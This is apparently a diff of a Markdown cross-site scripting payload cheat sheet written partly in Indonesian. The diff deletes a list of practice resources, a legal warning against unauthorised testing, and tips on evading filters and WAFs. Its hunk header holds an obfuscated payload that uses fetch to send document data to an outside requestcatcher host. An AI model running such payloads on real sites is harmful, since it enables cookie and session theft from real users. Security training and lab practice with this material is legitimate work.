@@ -2218,57 +2218,6 @@ Reflect.get([],'map').constructor('fetch("//kiwoyo.requestcatcher.com/?c="+docum
    ];
    ```
 
----
-
-## 📚 Testing Resources
-
-- **OWASP XSS Filter Evasion Cheat Sheet**
-- **PortSwigger Web Security Academy - XSS Labs**
-- **HackTheBox / TryHackMe - XSS Rooms**
-- **BugCrowd / HackerOne - Legal Bug Bounty Programs**
-- **XSS Hunter - Blind XSS Testing**
-
----
-
-## ⚖️ Legal Notice
-
-**PERINGATAN KERAS:**
-
-Penggunaan teknik ini tanpa izin tertulis adalah **ILEGAL** dan dapat dikenakan:
-
-- **Indonesia**: UU ITE Pasal 30 - Hukuman hingga 8 tahun penjara
-- **USA**: Computer Fraud and Abuse Act (CFAA) - Hukuman hingga 10 tahun
-- **UK**: Computer Misuse Act 1990 - Hukuman hingga 10 tahun
-- **EU**: GDPR violations - Denda hingga €20 juta
-
-**Gunakan HANYA untuk:**
-✅ Bug bounty programs dengan scope yang jelas
-✅ Penetration testing dengan written authorization
-✅ Lab/sandbox environment untuk pembelajaran
-✅ Own applications untuk security testing
-
-**JANGAN PERNAH:**
-❌ Test di website tanpa izin
-❌ Exfiltrate data real users
-❌ Cause damage atau disruption
-❌ Share payloads untuk malicious purposes
-
----
-
-## 💡 Tips for Lab Success
-
-1. **Start Simple**: Mulai dengan payload basic, lalu escalate
-2. **Inspect Filters**: Cek source code untuk understand filtering
-3. **Mix Techniques**: Combine multiple bypass methods
-4. **Test Contexts**: Try different injection points (attribute, script, etc)
-5. **Document Everything**: Save working payloads untuk reference
-6. **Use Burp Suite**: Automate testing dengan Intruder
-7. **Check Browser Console**: Debug errors untuk improve payload
-8. **Try Different Encodings**: Jika satu encoding blocked, try others
-9. **Understand WAF**: Learn pattern WAF blocks, bypass accordingly
-10. **Be Patient**: Complex bypasses butuh trial and error
-
----
 
 ## 🔥 Advanced Combination Example
 
